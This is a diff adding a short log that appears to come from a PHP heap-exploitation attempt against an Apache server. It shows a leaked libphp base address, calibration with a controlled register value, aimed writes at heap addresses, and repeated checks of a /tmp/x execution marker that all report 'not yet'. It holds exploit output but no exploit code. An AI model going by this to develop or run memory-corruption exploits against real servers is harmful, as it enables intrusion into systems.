@@ -1,0 +1,19 @@
+=== oom76: calibrate then aimed sequence, one boot ===
+    libphp base = 0x7f22ca8f9000
+[1] CAL warm (11)
+  cal-fire0: 200
+  cal-fire1: ERR
+    rdi=4141414141410000 phi=0 VA0=0x7f22c8201718
+    rc-check at VA0+3584: True (0100000008010000)
+[2] AIM warm (11), target=0x7f22c8202520 free_obj=0x7f22cac948a0
+[3] AIM sacrifice + finishers
+  aim-fire0: 200
+    /tmp/x: not yet
+  aim-fire1: 200
+    /tmp/x: not yet
+  aim-fire2: 200
+    /tmp/x: not yet
+  aim-fire3: 200
+    /tmp/x: not yet
+[4] restore
+    restored: SAPI=apache2handler lim=8M vars=100000
